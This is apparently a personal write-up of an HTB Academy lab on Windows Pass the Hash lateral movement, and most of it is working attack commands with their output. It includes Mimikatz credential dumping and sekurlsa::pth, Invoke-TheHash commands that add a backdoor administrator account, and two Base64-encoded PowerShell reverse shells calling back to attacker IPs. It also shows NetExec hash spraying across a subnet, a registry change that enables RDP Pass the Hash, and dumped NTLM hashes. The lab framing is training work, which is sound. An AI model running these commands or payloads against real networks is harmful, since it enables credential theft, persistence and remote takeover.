# Windows Lateral Movement Techniques

## Pass the Hash (PtH) - Teorie

As discussed in the previous sections, the attacker must have administrative privileges or particular privileges on the target machine to obtain a password hash. Hashes can be obtained in several ways, including:

* Dumping the local SAM database from a compromised host.
* Extracting hashes from the NTDS database (ntds.dit) on a Domain Controller.
* Pulling the hashes from memory (lsass.exe).

## Pass the Hash with Mimikatz (Windows)

The first tool we will use to perform a Pass the Hash attack is [Mimikatz](https://github.com/gentilkiwi). Mimikatz has a module named `sekurlsa::pth` that allows us to perform a Pass the Hash attack by starting a process using the hash of the user's password. To use this module, we will need the following:

* `/user` - The user name we want to impersonate.
* `/rc4` or `/NTLM` - NTLM hash of the user's password.
* `/domain` - Domain the user to impersonate belongs to. In the case of a local user account, we can use the computer name, localhost, or a dot (.).
* `/run` - The program we want to run with the user's context (if not specified, it will launch cmd.exe).

### **Pass the Hash from Windows Using Mimikatz**

```cmd-session
c:\tools> mimikatz.exe privilege::debug "sekurlsa::pth /user:julio /rc4:64F12CDDAA88057E06A81B54E73B949B /domain:inlanefreight.htb /run:cmd.exe" exit

user    : julio
domain  : inlanefreight.htb
program : cmd.exe
impers. : no
NTLM    : 64F12CDDAA88057E06A81B54E73B949B
  |  PID  8404
  |  TID  4268
  |  LSA Process was already R/W
  |  LUID 0 ; 5218172 (00000000:004f9f7c)
  \_ msv1_0   - data copy @ 0000028FC91AB510 : OK !
  \_ kerberos - data copy @ 0000028FC964F288
   \_ des_cbc_md4       -> null
   \_ des_cbc_md4       OK
   \_ des_cbc_md4       OK
   \_ des_cbc_md4       OK
   \_ des_cbc_md4       OK
   \_ des_cbc_md4       OK
   \_ des_cbc_md4       OK
   \_ *Password replace @ 0000028FC9673AE8 (32) -> null
```

Now we can use cmd.exe to execute commands in the user's context. For this example, `julio` can connect to a shared folder named `julio` on the DC.

![Command prompt showing mimikatz execution with privilege escalation and directory listing commands.](https://cdn.services-k8s.prod.aws.htb.systems/content/modules/308/img/pth_julio.jpg)

## Pass the Hash with PowerShell Invoke-TheHash (Windows)

For this example we will use the user `julio` and the hash `64F12CDDAA88057E06A81B54E73B949B`.

When using `Invoke-TheHash`, we have two options: SMB or WMI command execution. To use this tool, we need to specify the following parameters to execute commands in the target computer:

* `Target` - Hostname or IP address of the target.
* `Username` - Username to use for authentication.
* `Domain` - Domain to use for authentication. This parameter is unnecessary with local accounts or when using the @domain after the username.
* `Hash` - NTLM password hash for authentication. This function will accept either LM:NTLM or NTLM format.
* `Command` - Command to execute on the target. If a command is not specified, the function will check to see if the username and hash have access to WMI on the target.

### **Invoke-TheHash with SMB**

```powershell-session
PS c:\htb> cd C:\tools\Invoke-TheHash\
PS c:\tools\Invoke-TheHash> Import-Module .\Invoke-TheHash.psd1
PS c:\tools\Invoke-TheHash> Invoke-SMBExec -Target 172.16.1.10 -Domain inlanefreight.htb -Username julio -Hash 64F12CDDAA88057E06A81B54E73B949B -Command "net user mark Password123 /add && net localgroup administrators mark /add" -Verbose

VERBOSE: [+] inlanefreight.htb\julio successfully authenticated on 172.16.1.10
VERBOSE: inlanefreight.htb\julio has Service Control Manager write privilege on 172.16.1.10
VERBOSE: Service EGDKNNLQVOLFHRQTQMAU created on 172.16.1.10
VERBOSE: [*] Trying to execute command on 172.16.1.10
[+] Command executed with service EGDKNNLQVOLFHRQTQMAU on 172.16.1.10
VERBOSE: Service EGDKNNLQVOLFHRQTQMAU deleted on 172.16.1.10
```

We can also get a reverse shell connection in the target machine. If you are unfamiliar with reverse shells, review the [Shells & Payloads](https://academy.hackthebox.com/module/details/115) module on HTB Academy.

To get a reverse shell, we need to start our listener using Netcat on our Windows machine, which has the IP address `172.16.1.5`. We will use port `8001` to wait for the connection.

#### **Netcat listener**

```powershell-session
PS C:\tools> .\nc.exe -lvnp 8001

listening on [any] 8001 ...
```

To create a simple reverse shell using PowerShell, we can visit [revshells.com](https://www.revshells.com/), set our IP `172.16.1.5` and port `8001`, and select the option `PowerShell #3 (Base64)`, as shown in the following image.

![Reverse Shell Generator interface with IP 172.16.1.5, port 8001, and PowerShell Base64 payload.](https://cdn.services-k8s.prod.aws.htb.systems/content/modules/308/img/rshellonline.jpg)

Now we can execute `Invoke-TheHash` to execute our PowerShell reverse shell script in the target computer. Notice that instead of providing the IP address, which is `172.16.1.10`, we will use the machine name `DC01` (either would work)

### **Invoke-TheHash with WMI**

```powershell-session
PS c:\tools\Invoke-TheHash> Import-Module .\Invoke-TheHash.psd1
PS c:\tools\Invoke-TheHash> Invoke-WMIExec -Target DC01 -Domain inlanefreight.htb -Username julio -Hash 64F12CDDAA88057E06A81B54E73B949B -Command "powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQAwAC4AMQAwAC4AMQA0AC4AMwAzACIALAA4ADAAMAAxACkAOwAkAHMAdAByAGUAYQBtACAAPQAgACQAYwBsAGkAZQBuAHQALgBHAGUAdABTAHQAcgBlAGEAbQAoACkAOwBbAGIAeQB0AGUAWwBdAF0AJABiAHkAdABlAHMAIAA9ACAAMAAuAC4ANgA1ADUAMwA1AHwAJQB7ADAAfQA7AHcAaABpAGwAZQAoACgAJABpACAAPQAgACQAcwB0AHIAZQBhAG0ALgBSAGUAYQBkACgAJABiAHkAdABlAHMALAAgADAALAAgACQAYgB5AHQAZQBzAC4ATABlAG4AZwB0AGgAKQApACAALQBuAGUAIAAwACkAewA7ACQAZABhAHQAYQAgAD0AIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIAAtAFQAeQBwAGUATgBhAG0AZQAgAFMAeQBzAHQAZQBtAC4AVABlAHgAdAAuAEEAUwBDAEkASQBFAG4AYwBvAGQAaQBuAGcAKQAuAEcAZQB0AFMAdAByAGkAbgBnACgAJABiAHkAdABlAHMALAAwACwAIAAkAGkAKQA7ACQAcwBlAG4AZABiAGEAYwBrACAAPQAgACgAaQBlAHgAIAAkAGQAYQB0AGEAIAAyAD4AJgAxACAAfAAgAE8AdQB0AC0AUwB0AHIAaQBuAGcAIAApADsAJABzAGUAbgBkAGIAYQBjAGsAMgAgAD0AIAAkAHMAZQBuAGQAYgBhAGMAawAgACsAIAAiAFAAUwAgACIAIAArACAAKABwAHcAZAApAC4AUABhAHQAaAAgACsAIAAiAD4AIAAiADsAJABzAGUAbgBkAGIAeQB0AGUAIAA9ACAAKABbAHQAZQB4AHQALgBlAG4AYwBvAGQAaQBuAGcAXQA6ADoAQQBTAEMASQBJACkALgBHAGUAdABCAHkAdABlAHMAKAAkAHMAZQBuAGQAYgBhAGMAawAyACkAOwAkAHMAdAByAGUAYQBtAC4AVwByAGkAdABlACgAJABzAGUAbgBkAGIAeQB0AGUALAAwACwAJABzAGUAbgBkAGIAeQB0AGUALgBMAGUAbgBnAHQAaAApADsAJABzAHQAcgBlAGEAbQAuAEYAbAB1AHMAaAAoACkAfQA7ACQAYwBsAGkAZQBuAHQALgBDAGwAbwBzAGUAKAApAA=="

[+] Command executed with process id 520 on DC01
```

The result is a reverse shell connection from the DC01 host (172.16.1.10).

![PowerShell and command prompt showing Invoke-TheHash execution with network connection details and whoami command output.](https://cdn.services-k8s.prod.aws.htb.systems/content/modules/308/img/pth_invoke_the_hash.jpg)

## Pass the Hash with Impacket (Linux)

[Impacket](https://github.com/SecureAuthCorp/impacket) has several tools we can use for different operations such as `Command Execution` and `Credential Dumping`, `Enumeration`, etc. For this example, we will perform command execution on the target machine using `PsExec`.

### **Pass the Hash with Impacket PsExec**

```shell-session
eldeim@htb[/htb]$ impacket-psexec administrator@10.129.201.126 -hashes :30B3783CE2ABF1AF70F77D0660CF3453

Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation

[*] Requesting shares on 10.129.201.126.....
[*] Found writable share ADMIN$
[*] Uploading file SLUBMRXK.exe
[*] Opening SVCManager on 10.129.201.126.....
[*] Creating service AdzX on 10.129.201.126.....
[*] Starting service AdzX.....
[!] Press help for extra shell commands
Microsoft Windows [Version 10.0.19044.1415]
(c) Microsoft Corporation. All rights reserved.

C:\Windows\system32>
```

There are several other tools in the Impacket toolkit we can use for command execution using Pass the Hash attacks, such as:

* [impacket-wmiexec](https://github.com/SecureAuthCorp/impacket/blob/master/examples/wmiexec.py)
* [impacket-atexec](https://github.com/SecureAuthCorp/impacket/blob/master/examples/atexec.py)
* [impacket-smbexec](https://github.com/SecureAuthCorp/impacket/blob/master/examples/smbexec.py)

### Pass the Hash with NetExec (Linux)

[NetExec](https://github.com/Pennyw0rth/NetExec) is a post-exploitation tool that helps automate assessing the security of large Active Directory networks. We can use NetExec to try to authenticate to some or all hosts in a network looking for one host where we can authenticate successfully as a local admin. This method is also called "Password Spraying" and is covered in-depth in the `Active Directory Enumeration & Attacks` module. Note that this method can lock out domain accounts, so keep the target domain's account lockout policy in mind and make sure to use the local account method, which will try just one login attempt on a host in a given range using the credentials provided if that is your intent.

```shell-session
eldeim@htb[/htb]# netexec smb 172.16.1.0/24 -u Administrator -d . -H 30B3783CE2ABF1AF70F77D0660CF3453

SMB         172.16.1.10   445    DC01             [*] Windows 10.0 Build 17763 x64 (name:DC01) (domain:.) (signing:True) (SMBv1:False)
SMB         172.16.1.10   445    DC01             [-] .\Administrator:30B3783CE2ABF1AF70F77D0660CF3453 STATUS_LOGON_FAILURE 
SMB         172.16.1.5    445    MS01             [*] Windows 10.0 Build 19041 x64 (name:MS01) (domain:.) (signing:False) (SMBv1:False)
SMB         172.16.1.5    445    MS01             [+] .\Administrator 30B3783CE2ABF1AF70F77D0660CF3453 (Pwn3d!)
```

If we want to perform the same actions but attempt to authenticate to each host in a subnet using the local administrator password hash, we could add `--local-auth` to our command. This method is helpful if we obtain a local administrator hash by dumping the local SAM database on one host and want to check how many (if any) other hosts we can access due to local admin password re-use. If we see `Pwn3d!`, it means that the user is a local administrator on the target computer. We can use the option `-x` to execute commands. It is common to see password reuse against many hosts in the same subnet. Organizations will often use gold images with the same local admin password or set this password the same across multiple hosts for ease of administration. If we run into this issue on a real-world engagement, a great recommendation for the customer is to implement the [Local Administrator Password Solution (LAPS)](https://www.microsoft.com/en-us/download/details.aspx?id=46899), which randomizes the local administrator password and can be configured to have it rotate on a fixed interval.

#### **NetExec - Command Execution**

```shell-session
eldeim@htb[/htb]# netexec smb 10.129.201.126 -u Administrator -d . -H 30B3783CE2ABF1AF70F77D0660CF3453 -x whoami

SMB         10.129.201.126  445    MS01            [*] Windows 10 Enterprise 10240 x64 (name:MS01) (domain:.) (signing:False) (SMBv1:True)
SMB         10.129.201.126  445    MS01            [+] .\Administrator 30B3783CE2ABF1AF70F77D0660CF3453 (Pwn3d!)
SMB         10.129.201.126  445    MS01            [+] Executed command 
SMB         10.129.201.126  445    MS01            MS01\administrator
```

Review the [NetExec documentation Wiki](https://www.netexec.wiki/) to learn more about the tool's extensive features.

## Pass the Hash with evil-winrm (Linux)

[Evil-WinRM](https://github.com/Hackplayers/evil-winrm) is another tool we can use to authenticate using the Pass the Hash attack with PowerShell remoting. If SMB is blocked or we don't have administrative rights, we can use this alternative protocol to connect to the target machine.

### **Pass the Hash with evil-winrm**

```shell-session
eldeim@htb[/htb]$ evil-winrm -i 10.129.201.126 -u Administrator -H 30B3783CE2ABF1AF70F77D0660CF3453

Evil-WinRM shell v3.3

Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users\Administrator\Documents>
```

> Note: When using a domain account, we need to include the domain name, for example: administrator@inlanefreight.htb

## Pass the Hash with RDP (Linux)

We can perform an RDP PtH attack to gain GUI access to the target system using tools like `xfreerdp`.

There are a few caveats to this attack:

* `Restricted Admin Mode`, which is disabled by default, should be enabled on the target host; otherwise, you will be presented with the following error:

![Error message: Account restrictions prevent signing in due to blank passwords, limited sign-in times, or policy restrictions.](https://cdn.services-k8s.prod.aws.htb.systems/content/modules/308/img/rdp_session-4.png)

This can be enabled by adding a new registry key `DisableRestrictedAdmin` (REG\_DWORD) under `HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Lsa` with the value of 0. It can be done using the following command:

### **Enable Restricted Admin Mode to allow PtH**

```cmd-session
c:\tools> reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f
```

![Registry Editor showing path to Lsa with DisableRestrictedAdmin set to 0.](https://cdn.services-k8s.prod.aws.htb.systems/content/modules/308/img/rdp_session-5.png)

Once the registry key is added, we can use `xfreerdp` with the option `/pth` to gain RDP access:

### **Pass the Hash using RDP**

```shell-session
eldeim@htb[/htb]$ xfreerdp  /v:10.129.201.126 /u:julio /pth:64F12CDDAA88057E06A81B54E73B949B

[15:38:26:999] [94965:94966] [INFO][com.freerdp.core] - freerdp_connect:freerdp_set_last_error_ex resetting error state
[15:38:26:999] [94965:94966] [INFO][com.freerdp.client.common.cmdline] - loading channelEx rdpdr
...snip...
[15:38:26:352] [94965:94966] [ERROR][com.freerdp.crypto] - @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
[15:38:26:352] [94965:94966] [ERROR][com.freerdp.crypto] - @           WARNING: CERTIFICATE NAME MISMATCH!           @
[15:38:26:352] [94965:94966] [ERROR][com.freerdp.crypto] - @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
...SNIP...
```

![Windows desktop accessed via FreeRDP with Parrot Terminal showing command execution and desktop icons for Recycle Bin, Invoke-TheHash, and mimikatz.](https://cdn.services-k8s.prod.aws.htb.systems/content/modules/308/img/rdp_session_new.jpg)

***

### Lab - Questions

> Authenticate to 10.129.63.49 (ACADEMY-PWATTACKS-LM-MS01) with user "Administrator" and password "30B3783CE2ABF1AF70F77D0660CF3453"

* Access the target machine using any Pass-the-Hash tool. Submit the contents of the file located at C:\pth.txt.

Fristly, I confirm that the user is an administrator, and before, confirm that i can connect it RDP -->

```
nxc smb 10.129.63.49 -u Administrator -H 30B3783CE2ABF1AF70F77D0660CF3453 -d . -x whoami
SMB         10.129.63.49    445    MS01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:MS01) (domain:inlanefreight.htb) (signing:False) (SMBv1:False)
SMB         10.129.63.49    445    MS01             [+] .\Administrator:30B3783CE2ABF1AF70F77D0660CF3453 (Pwn3d!)
SMB         10.129.63.49    445    MS01             [+] Executed command via wmiexec
SMB         10.129.63.49    445    MS01             ms01\administrator
```

```
┌─[eu-academy-2]─[10.10.15.68]─[htb-ac-489480@htb-vsclul6fb5]─[~]
└──╼ [★]$ nxc rdp 10.129.63.49 -u Administrator -H 30B3783CE2ABF1AF70F77D0660CF3453 -d .
RDP         10.129.63.49    3389   MS01             [*] Windows 10 or Windows Server 2016 Build 17763 (name:MS01) (domain:.) (nla:True)
RDP         10.129.63.49    3389   MS01             [+] .\Administrator:30B3783CE2ABF1AF70F77D0660CF3453 (Pwn3d!)
```

Once we confim that it credentials is valid, procress to connect via RDP -->

```
xfreerdp /v:10.129.63.49 /u:Administrator /pth:30B3783CE2ABF1AF70F77D0660CF3453
```

<figure><img src="../../../../.gitbook/assets/image (17) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

FUCK! We need change the restrictived admin permisions, so... use netexec to execute this command -->

```
reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f
```

```
nxc smb 10.129.63.49 -u Administrator -H 30B3783CE2ABF1AF70F77D0660CF3453 -d . -x 'reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f'
```

<figure><img src="../../../../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

And now... try to connect again. Once we connect to the machine, search the pth.txt file -->

<figure><img src="../../../../.gitbook/assets/image (2) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

* Try to connect via RDP using the Administrator hash. What is the name of the registry value that must be set to 0 for PTH over RDP to work? Change the registry key value and connect using the hash with RDP. Submit the name of the registry value name as the answer.

`DisableRestrictedAdmin`

* Connect via RDP and use Mimikatz located in c:\tools to extract the hashes presented in the current session. What is the NTLM/RC4 hash of David's account?

For it, we need get the password or hash about david user, so... try to get lsa and obtain the password in texplain.

<figure><img src="../../../../.gitbook/assets/image (3) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Now, with the adminitrador, use mimikat for get  the ntlm/RC4 hash of david

```
mimikatz.exe privilege::debug "sekurlsa::logonpasswords" exit
 
[redacted]
 msv :
         [00000003] Primary
         * Username : david
         * Domain   : INLANEFREIGHT
         * NTLM     : c39f2beb3d2ec06a62cb887fb391dee0
         * SHA1     : 2277c28035275149d01a8de530cc13b74f59edfb
         * DPAPI    : eaa6db50c1544304014d858928d9694f
        tspkg :
        wdigest :
         * Username : david
         * Domain   : INLANEFREIGHT
         * Password : (null)
        kerberos :
         * Username : david
         * Domain   : INLANEFREIGHT.HTB
         * Password : (null)
```

* Using David's hash, perform a Pass the Hash attack to connect to the shared folder \DC01\david and read the file david.txt.

```
 ./mimikatz.exe privilege::debug "sekurlsa::pth /user:david /rc4:c39f2beb3d2ec06a62cb887fb391dee0 /domain:inlanefreight.htb /run:cmd.exe" exit     
```

And then, in the cmd search the folder -->

<figure><img src="../../../../.gitbook/assets/image (4) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

* Using Julio's hash, perform a Pass the Hash attack to connect to the shared folder \DC01\julio and read the file julio.txt

Make the same of the before question, get the ntlm about julio user and get a cmd -->

<pre><code><strong>PS C:\tools> mimikatz # sekurlsa::logonpasswords
</strong>Authentication Id : 0 ; 497526 (00000000:00079776)                                                                                             Session           : Service from 0                                                                                                             User Name         : julio                                                                                                                      Domain            : INLANEFREIGHT                                                                                                              Logon Server      : DC01                                                                                                                       Logon Time        : 12/6/2025 9:58:04 AM                                                                                                       SID               : S-1-5-21-3325992272-2815718403-617452758-1106                                                                                      msv :                                                                                                                                           [00000003] Primary                                                                                                                             * Username : julio                                                                                                                             * Domain   : INLANEFREIGHT                                                                                                                     * NTLM     : 64f12cddaa88057e06a81b54e73b949b                                                                                                  * SHA1     : cba4e545b7ec918129725154b29f055e4cd5aea8                                                                                          * DPAPI    : 634db497baef212b777909a4ccaaf700                                                                                                 tspkg :                                                                                                                                        wdigest :                                                                                                                                       * Username : julio                                                                                                                             * Domain   : INLANEFREIGHT                                                                                                                     * Password : (null)                                                                                                                           kerberos :                                                                                                                                      * Username : julio                                                                                                                             * Domain   : INLANEFREIGHT.HTB                                                                                                                 * Password : (null)                                                                                                                           ssp :                                                                                                                                          credman :                              

./mimikatz.exe privilege::debug "sekurlsa::pth /user:julio /rc4:64f12cddaa88057e06a81b54e73b949b /domain:inlanefreight.htb /run:cmd.exe" exit     
</code></pre>

* Using Julio's hash, perform a Pass the Hash attack, launch a PowerShell console and import Invoke-TheHash to create a reverse shell to the machine you are connected via RDP (the target machine, DC01, can only connect to MS01). Use the tool nc.exe located in c:\tools to listen for the reverse shell. Once connected to the DC01, read the flag in C:\julio\flag.txt.

I’ll open two powershells as Administrator: one will run **Invoke-TheHash** and the other one will run **Netcat**:

* First command prompt:

```
.\nc.exe -lvnp 5000
```

* Second command prompt:
  * To get the execution command, I’ll use [https://www.revshells.com/](https://www.revshells.com/)

<figure><img src="../../../../.gitbook/assets/image (16) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

```
ipconfig # To get the ip address of the machine Import-Module .\Invoke-TheHash.psd1 Invoke-SMBExec -Target 172.16.1.10 -Domain inlanefreight.htb -Username julio -Hash 64F12CDDAA88057E06A81B54E73B949B -Command "net user mark Password123 /add && net localgroup administrators mark /add" -Verbose Invoke-WMIExec -Target DC01 -Domain inlanefreight.htb -Username julio -Hash 64F12CDDAA88057E06A81B54E73B949B -Command "powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQA3ADIALgAxADYALgAxAC4ANQAiACwAOAAwADAAMQApADsAJABzAHQAcgBlAGEAbQAgAD0AIAAkAGMAbABpAGUAbgB0AC4ARwBlAHQAUwB0AHIAZQBhAG0AKAApADsAWwBiAHkAdABlAFsAXQBdACQAYgB5AHQAZQBzACAAPQAgADAALgAuADYANQA1ADMANQB8ACUAewAwAH0AOwB3AGgAaQBsAGUAKAAoACQAaQAgAD0AIAAkAHMAdAByAGUAYQBtAC4AUgBlAGEAZAAoACQAYgB5AHQAZQBzACwAIAAwACwAIAAkAGIAeQB0AGUAcwAuAEwAZQBuAGcAdABoACkAKQAgAC0AbgBlACAAMAApAHsAOwAkAGQAYQB0AGEAIAA9ACAAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAALQBUAHkAcABlAE4AYQBtAGUAIABTAHkAcwB0AGUAbQAuAFQAZQB4AHQALgBBAFMAQwBJAEkARQBuAGMAbwBkAGkAbgBnACkALgBHAGUAdABTAHQAcgBpAG4AZwAoACQAYgB5AHQAZQBzACwAMAAsACAAJABpACkAOwAkAHMAZQBuAGQAYgBhAGMAawAgAD0AIAAoAGkAZQB4ACAAJABkAGEAdABhACAAMgA+ACYAMQAgAHwAIABPAHUAdAAtAFMAdAByAGkAbgBnACAAKQA7ACQAcwBlAG4AZABiAGEAYwBrADIAIAA9ACAAJABzAGUAbgBkAGIAYQBjAGsAIAArACAAIgBQAFMAIAAiACAAKwAgACgAcAB3AGQAKQAuAFAAYQB0AGgAIAArACAAIgA+ACAAIgA7ACQAcwBlAG4AZABiAHkAdABlACAAPQAgACgAWwB0AGUAeAB0AC4AZQBuAGMAbwBkAGkAbgBnAF0AOgA6AEEAUwBDAEkASQApAC4ARwBlAHQAQgB5AHQAZQBzACgAJABzAGUAbgBkAGIAYQBjAGsAMgApADsAJABzAHQAcgBlAGEAbQAuAFcAcgBpAHQAZQAoACQAcwBlAG4AZABiAHkAdABlACwAMAAsACQAcwBlAG4AZABiAHkAdABlAC4ATABlAG4AZwB0AGgAKQA7ACQAcwB0AHIAZQBhAG0ALgBGAGwAdQBzAGgAKAApAH0AOwAkAGMAbABpAGUAbgB0AC4AQwBsAG8AcwBlACgAKQA="
```

<figure><img src="../../../../.gitbook/assets/image (17) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
